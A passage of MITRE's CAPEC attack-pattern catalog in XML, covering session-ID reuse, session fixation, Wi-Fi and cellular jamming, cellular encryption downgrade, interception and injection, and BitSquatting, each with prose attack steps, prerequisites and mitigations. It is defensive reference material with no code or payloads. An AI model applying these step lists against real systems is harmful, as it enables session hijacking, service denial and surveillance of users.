            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker interacts with the target host and finds that session IDs are used to authenticate users.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>The attacker steals a session ID from a valid user.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target host uses session IDs to keep track of the users.</Prerequisite>
            <Prerequisite>Session IDs are used to control access to resources.</Prerequisite>
            <Prerequisite>The session IDs used by the target host are not well protected from session theft.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">If an attacker can steal a valid session ID, he can then try to be authenticated with that stolen session ID.</Skill>
            <Skill Level="Medium">More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing his valid session ID.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Always invalidate a session ID after the user logout.</Mitigation>
            <Mitigation>Setup a session time out for the session IDs.</Mitigation>
            <Mitigation>Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.</Mitigation>
            <Mitigation>Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.</Mitigation>
            <Mitigation>Encrypt the session data associated with the session ID.</Mitigation>
            <Mitigation>Use multifactor authentication.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428</Example>
            <Example>Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="294"/>
            <Related_Weakness CWE_ID="290"/>
            <Related_Weakness CWE_ID="346"/>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="488"/>
            <Related_Weakness CWE_ID="539"/>
            <Related_Weakness CWE_ID="200"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="664"/>
            <Related_Weakness CWE_ID="732"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="601" Name="Jamming" Abstraction="Standard" Status="Draft">
         <Description>An adversary uses radio noise or signals in an attempt to disrupt communications. By intentionally overwhelming system resources with illegitimate traffic, service is denied to the legitimate traffic of authorized users.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="607">
               <Exclude_Related Exclude_ID="514"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>The jamming of equipment denies the availability of functioning communications services.</Note>
            </Consequence>
         </Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="603" Name="Blockage" Abstraction="Standard" Status="Draft">
         <Description>An adversary blocks the delivery of an important system resource causing the system to fail or stop working.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="607"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack pattern requires knowledge of where important system resources are logically located as well as how they operate.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Blocking a resource from functional operation denies its availability to authorized users.</Note>
            </Consequence>
         </Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="604" Name="Wi-Fi Jamming" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker actively transmits on the Wi-Fi channel to prevent users from transmitting or receiving data from the targeted Wi-Fi network. There are several known techniques to perform this attack – for example: the attacker may flood the Wi-Fi access point (e.g. the retransmission device) with deauthentication frames. Another method is to transmit high levels of noise on the RF band used by the Wi-Fi network.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="601"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Lack of anti-jam features in 802.11</Prerequisite>
            <Prerequisite>Lack of authentication on deauthentication/disassociation packets on 802.11-based networks</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">This attack can be performed by low capability attackers with freely available tools. Commercial tools are also available that can target select networks or all WiFi networks within a range of several miles.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>A successful attack will deny the availability of the Wi-fi network to authorized users.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>The attacker's goal is to prevent users from accessing the wireless network. Denying connectivity to the wireless network prevents the user from being able to transmit or receive any data, which also prevents VOIP calls, however this attack poses no threat to data confidentiality.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Countermeasures have been proposed for both disassociation flooding and RF jamming, however these countermeasures are not standardized and would need to be supported on both the retransmission device and the handset in order to be effective. Commercial products are not currently available that support jamming countermeasures for Wi-Fi.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Related_Vulnerabilities, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="605" Name="Cellular Jamming" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. Several existing techniques are known in the open literature for this attack for 2G, 3G, and 4G LTE cellular technology. For example, some attacks target cell towers by overwhelming them with false status messages, while others introduce high levels of noise on signaling channels.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="601"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Lack of anti-jam features in cellular technology (2G, 3G, 4G, LTE)</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">This attack can be performed by low capability attackers with commercially available tools.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>The attacker's goal is to prevent users from accessing the cellular network. Denying connectivity to the cellular network prevents the user from being able to transmit or receive any data, which also prevents VOIP calls, however this attack poses no threat to data confidentiality.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Mitigating this attack requires countermeasures employed on both the retransmission device as well as on the cell tower. Therefore, any system that relies on existing commercial cell towards will likely be vulnerable to this attack. By using a private cellular LTE network (i.e., a custom cell tower), jamming countermeasures could be developed and employed.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="606" Name="Weakening of Cellular Encryption" Abstraction="Detailed" Status="Draft">
         <Description>An attacker, with control of a Cellular Rogue Base Station or through cooperation with a Malicious Mobile Network Operator can force the mobile device (e.g., the retransmission device) to use no encryption (A5/0 mode) or to use easily breakable encryption (A5/1 or A5/2 mode).</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="620"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Cellular devices that allow negotiating security modes to facilitate backwards compatibility and roaming on legacy networks.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Adversaries can purchase and implement rogue BTS stations at a cost effective rate, and can push a mobile device to downgrade to a non-secure cellular protocol like 2G over GSM or CDMA.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Tracking, Network Reconnaissance</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.</Mitigation>
            <Mitigation>Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="757"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="607" Name="Obstruction" Abstraction="Meta" Status="Draft">
         <Description>An attacker obstructs the interactions between system components. By interrupting or disabling these interactions, an adversary can often force the system into a degraded state or even to fail.</Description>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
            </Consequence>
         </Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="608" Name="Cryptanalysis of Cellular Encryption" Abstraction="Detailed" Status="Draft">
         <Description>The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="97"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Adversaries can rent commercial supercomputer time globally to conduct cryptanalysis on encrypted data captured from mobile devices. Foreign governments have their own cryptanalysis technology and capabilities. Commercial cellular standards for encryption (GSM and CDMA) are also subject to adversary cryptanalysis.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Reveals IMSI and IMEI for tracking of retransmission device and enables further follow-on attacks by revealing black network control messages. (e.g., revealing IP addresses of enterprise servers for VOIP connectivity)</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.</Mitigation>
            <Mitigation>Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="327"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="609" Name="Cellular Traffic Intercept" Abstraction="Detailed" Status="Draft">
         <Description>Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="157"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Adversaries can purchase hardware and software solutions, or create their own solutions, to capture/intercept cellular radio traffic. The cost of a basic Base Transceiver Station (BTS) to broadcast to local mobile cellular radios in mobile devices has dropped to very affordable costs. The ability of commercial cellular providers to monitor for “rogue” BTS stations is poor in many areas and it is assumed that “rogue” BTS stations exist in urban areas.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>Capture all cellular and RF traffic from mobile and retransmission devices. Move bulk traffic capture to storage area for cryptanalysis of encrypted traffic, and telemetry analysis of non-encrypted data. (packet headers, cellular power data, signal strength, etc.)</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Encryption of all data packets emanating from the smartphone to a retransmission device via two encrypted tunnels with Suite B cryptography, all the way to the VPN gateway at the datacenter.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="311"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="61" Name="Session Fixation" Abstraction="Detailed" Status="Draft">
         <Description>The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="593"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Setup the Attack] Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.</Description>
               <Technique>The attacker chooses a predefined identifier that he knows.</Technique>
               <Technique>The attacker creates a trap session for the victim.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attract a Victim] Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.</Description>
               <Technique>Attackers can put links on web sites (such as forums, blogs, or comment forms).</Technique>
               <Technique>Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.</Technique>
               <Technique>Attackers can email attack URLs to potential victims through spam and phishing techniques.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Abuse the Victim's Session] Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.</Description>
               <Technique>The attacker loads the predefined session ID into his browser and browses to protected data or functionality.</Technique>
               <Technique>The attacker loads the predefined session ID into his software and utilizes functionality with the rights of the victim.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Session identifiers that remain unchanged when the privilege levels change.</Prerequisite>
            <Prerequisite>Permissive session management mechanism that accepts random user-generated session identifiers</Prerequisite>
            <Prerequisite>Predictable session identifiers</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Only basic skills are required to determine and fixate session identifiers in a user's browser. Subsequent attacks may require greater skill levels depending on the attackers' motives.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>There are no indicators for the server since a fixated session identifier is similar to an ordinarily generated one. However, too many invalid sessions due to invalid session identifiers is a potential warning.</Indicator>
            <Indicator>A client can be suspicious if a received link contains preset session identifiers. However, this depends on the client's knowledge of such an issue. Also, fixation through Cross Site Scripting or hidden form fields is usually difficult to detect.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use a strict session management mechanism that only accepts locally generated session identifiers: This prevents attackers from fixating session identifiers of their own choice.</Mitigation>
            <Mitigation>Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.</Mitigation>
            <Mitigation>Use session identifiers that are difficult to guess or brute-force: One way for the attackers to obtain valid session identifiers is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Consider a banking application that issues a session identifier in the URL to a user before login, and uses the same identifier to identify the customer following successful authentication. An attacker can easily leverage session fixation to access a victim's account by having the victim click on a forged link that contains a valid session identifier from a trapped session setup by the attacker. Once the victim is authenticated, the attacker can take over the session and continue with the same levels of privilege as the victim.</Example>
            <Example>An attacker can hijack user sessions, bypass authentication controls and possibly gain administrative privilege by fixating the session of a user authenticating to the Management Console on certain versions of Macromedia JRun 4.0. This can be achieved by setting the session identifier in the user's browser and having the user authenticate to the Management Console. Session fixation is possible since the application server does not regenerate session identifiers when there is a change in the privilege levels. See also: CVE-2004-2182</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="361"/>
            <Related_Weakness CWE_ID="664"/>
            <Related_Weakness CWE_ID="732"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="610" Name="Cellular Data Injection" Abstraction="Detailed" Status="Stable">
         <Description>Adversaries inject data into mobile technology traffic (data flows or signaling data) to disrupt communications or conduct additional surveillance operations.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="240"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>None</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Often achieved by nation states in conjunction with commercial cellular providers to conduct cellular traffic intercept and possible traffic injection.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Attackers can disrupt or deny mobile technology communications and operations.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Modify Data</Impact>
               <Note>Attackers can inject false data into data or signaling system data flows of communications and operations, or re-route data flows or signaling data for the purpose of further data intercept and capture.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Commercial defensive technology to detect and alert to any attempts to modify mobile technology data flows or to inject new data into existing data flows and signaling data.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="611" Name="BitSquatting" Abstraction="Detailed" Status="Draft">
         <Description>An adversary registers a domain name one bit different than a trusted domain. A BitSquatting attack leverages random errors in memory to direct Internet traffic to adversary-controlled destinations. BitSquatting requires no exploitation or complicated reverse engineering, and is operating system and architecture agnostic. Experimental observations show that BitSquatting popular websites could redirect non-trivial amounts of Internet traffic to a malicious entity.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="513"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="543"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.</Description>
               <Technique>Research popular or high traffic websites.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the BitSquatted URL.</Description>
               <Technique>Register the BitSquatted domain.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Wait for a user to visit the domain] Finally, the adversary simply waits for a user to be unintentionally directed to the BitSquatted domain.</Description>
               <Technique>Simply wait for an error in memory to occur, redirecting the user to the malicious domain.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Adversaries must be able to register DNS hostnames/URL’s.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the intention of the adversary, a successful BitSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Authenticate all servers and perform redundant checks when using DNS hostnames.</Mitigation>
            <Mitigation>When possible, use error-correcting (ECC) memory in local devices as non-ECC memory is significantly more vulnerable to faults.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-485"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Architectural_Paradigms, Attack_Motivation-Consequences, Attack_Phases, Attack_Prerequisites, Description, Description Summary, Methods_of_Attack, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="612" Name="WiFi MAC Address Tracking" Abstraction="Detailed" Status="Draft">
         <Description>In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future.</Description>
         <Typical_Severity>Low</Typical_Severity>
